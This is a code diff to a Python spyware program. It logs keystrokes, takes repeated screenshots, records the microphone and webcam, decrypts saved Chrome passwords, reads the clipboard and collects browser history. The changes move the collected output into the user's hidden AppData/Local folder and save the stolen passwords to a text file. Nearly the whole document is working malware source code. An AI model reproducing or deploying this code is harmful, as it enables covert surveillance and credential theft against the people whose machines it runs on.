@@ -15,11 +15,18 @@ import base64
 import sqlite3
 import win32crypt
 from Crypto.Cipher import AES
-from datetime import timezone, datetime, timedelta, time
+from datetime import timezone, datetime, timedelta
+import time
+
+
+ROOT_PATH = os.path.expanduser("~")
+ROOT_PATH = ROOT_PATH.replace("\\", "/")
+PATH = ROOT_PATH + "/AppData/Local"
+print(PATH)
 
 
 def keylogger():
-    logging.basicConfig(filename=('./results/key_log/' + 'key_logs.txt'),
+    logging.basicConfig(filename=(f'{PATH}/results/key_log/' + 'key_logs.txt'),
                         level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
     def on_press(Key): return logging.info(str(Key))
@@ -30,7 +37,7 @@ def keylogger():
 def screenshot():
     for _ in range(0, 60):
         picture = ImageGrab.grab()
-        picture.save('./results/screenshots/' + 'screenshot_{}.png'.format(_))
+        picture.save(f'{PATH}/results/screenshots/' + 'screenshot_{}.png'.format(_))
         time.sleep(5)
 
 
@@ -42,7 +49,7 @@ def microphone():
         recording = sounddevice.rec(
             int(seconds * fs), samplerate=fs, channels=2)
         sounddevice.wait()
-        write_rec('./results/microphone/' +
+        write_rec(f'{PATH}/results/microphone/' +
                   '{}_mic_recording.wav'.format(_), fs, recording)
 
 
@@ -52,7 +59,7 @@ def webcam():
 
         for _ in range(0, 60):
             ret, image = cam.read()
-            file = ('./results/webcam/' + '{}.jpg'.format(_))
+            file = (f'{PATH}/results/webcam/' + '{}.jpg'.format(_))
             cv2.imwrite(file, image)
             time.sleep(5)
 
@@ -83,40 +90,49 @@ def get_encryption_key():
 
 def decrypt_password(password, key):
     try:
-        # get the initialization vector
         iv = password[3:15]
         password = password[15:]
-        # generate cipher
         cipher = AES.new(key, AES.MODE_GCM, iv)
-        # decrypt password
+
         return cipher.decrypt(password)[:-16].decode()
     except:
         try:
+
             return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
         except:
+
             return ""
 
 
 def main():
 
-    directories = ['./results/screenshots/', './results/key_log/',
-                   './results/microphone/', './results/webcam/']
+    create_folder = f'{PATH}/results'
+
+    if os.path.exists(create_folder):
+        print("Directory already exists")
+        shutil.rmtree(create_folder)
+        print("Deleted {} directory".format(create_folder))
+        os.mkdir(create_folder)
+        print("Created new directory")
+
+    else:
+        os.mkdir(create_folder)
+        print("Created new directory")
+
+    directories = [f'{PATH}/results/screenshots/', f'{PATH}/results/key_log/',
+                   f'{PATH}/results/microphone/', f'{PATH}/results/webcam/']
 
     for i in directories:
         if os.path.exists(i):
-
-            if os.listdir(i) is False:
-                os.rmdir(i)
-                print("Directory was already empty")
-
-            else:
-                shutil.rmtree(i)
-                print("Deleted {} directory".format(i))
-                os.mkdir(i)
-                print("Created new directory")
+            print("Directory already exists")
+            shutil.rmtree(create_folder)
+            print("Deleted {} directory".format(i))
+            os.mkdir(i)
+            print("Created new directory")
 
         else:
-            print("Directory was not found")
+            os.mkdir(i)
+            print("Created new directory")
 
     # Get Chrome passwords
     key = get_encryption_key()
@@ -135,6 +151,8 @@ def main():
     cursor.execute(
         "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
 
+    browser_passwords = []
+
     for row in cursor.fetchall():
         origin_url = row[0]
         action_url = row[1]
@@ -143,17 +161,22 @@ def main():
         date_created = row[4]
         date_last_used = row[5]
         if username or password:
-            print(f"Origin URL: {origin_url}")
-            print(f"Action URL: {action_url}")
-            print(f"Username: {username}")
-            print(f"Password: {password}")
+            browser_passwords.append(f"Origin URL: {origin_url}")
+            browser_passwords.append(f"Action URL: {action_url}")
+            browser_passwords.append(f"Username: {username}")
+            browser_passwords.append(f"Password: {password}")
         else:
             continue
         if date_created != 86400000000 and date_created:
-            print(f"Creation date: {str(get_chrome_datetime(date_created))}")
+            browser_passwords.append(f"Creation date: {str(get_chrome_datetime(date_created))}")
         if date_last_used != 86400000000 and date_last_used:
-            print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
-        print("="*50)
+            browser_passwords.append(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
+        browser_passwords.append("="*50)
+
+    with open(f'{PATH}/results/key_log/' + 'passwords.txt', 'a') as browser_psw:
+        browser_psw.write(json.dumps(
+            browser_passwords, indent=4, sort_keys=True))
+
     cursor.close()
     db.close()
     try:
@@ -162,12 +185,15 @@ def main():
         pass
 
     # Clipboard Data
-    win32clipboard.OpenClipboard()
-    pasted_data = win32clipboard.GetClipboardData()
-    win32clipboard.CloseClipboard()
+    try:
+        win32clipboard.OpenClipboard()
+        pasted_data = win32clipboard.GetClipboardData()
+        win32clipboard.CloseClipboard()
 
-    with open('./results/key_log/' + 'clipboard_info.txt', 'a') as clipboard_info:
-        clipboard_info.write('Clipboard Data: ' + pasted_data + ' \n')
+        with open(f'{PATH}/results/key_log/' + 'clipboard_info.txt', 'a') as clipboard_info:
+            clipboard_info.write('Clipboard Data: ' + pasted_data + ' \n')
+    except:
+        print("Couldn't get Clipboard Data")
 
     # Browser History
     browser_history = []
@@ -175,9 +201,9 @@ def main():
     db_path = bh.get_database_paths()
     hist = bh.get_browserhistory()
     browsers = hist.keys()
-    print(browsers)
+
     browser_history.extend((bh_user, db_path, hist))
-    with open('./results/key_log/' + 'browser.txt', 'a') as browser_txt:
+    with open(f'{PATH}/results/key_log/' + 'browser.txt', 'a') as browser_txt:
         browser_txt.write(json.dumps(
             browser_history, indent=4, sort_keys=True))
 
